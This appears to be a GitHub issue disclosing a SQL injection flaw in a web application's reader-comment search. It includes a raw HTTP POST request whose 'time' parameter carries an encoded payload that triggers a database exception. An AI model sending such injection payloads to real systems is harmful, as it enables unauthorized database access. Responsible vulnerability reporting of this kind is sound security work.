| Hello, we found that your project has a SQL injection vulnerability. The details are as follows.   1. **Vulnerability function point**   The function point exists in Author Center ->Reader Comments ->Search [image](https://user-images.githubusercontent.com/27681113/217201013-5d73c569-9698-4065-bc68-5702c79dd701.png)   2. **Vulnerability details**   Httpraw packet  ``` POST /index.php/author/comment HTTP/1.1 Host: 192.168.43.227:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Cookie:  Referer: http://192.168.43.227:81/index.php/author/comment Upgrade-Insecure-Requests: 1 Accept-Encoding: gzip Content-Type: application/x-www-form-urlencoded Content-Length: 29  name=123&time=%5c%19%22%5c%28  ```  Check the response after sending the packet, and you can see that the database has thrown an exception.
